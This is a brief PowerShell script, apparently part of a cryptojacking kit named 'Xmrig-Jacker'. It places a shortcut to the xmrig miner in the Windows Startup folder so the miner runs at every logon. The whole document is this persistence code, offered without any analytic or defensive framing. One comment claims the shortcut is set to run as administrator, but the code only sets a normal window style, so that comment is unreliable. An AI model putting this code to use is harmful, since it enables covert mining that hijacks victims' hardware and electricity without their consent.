$scriptPath = "C:\temp\Xmrig-Jacker-main\xmrig\xmrig.exe"
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\xmrig.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $scriptPath
$shortcut.Save()

# Get the shortcut object using the Windows Script Host Shell object
$shortcut = $shell.CreateShortcut($shortcutPath)

# Update the shortcut properties to run as administrator
$shortcut.WindowStyle = 1
$shortcut.Save()

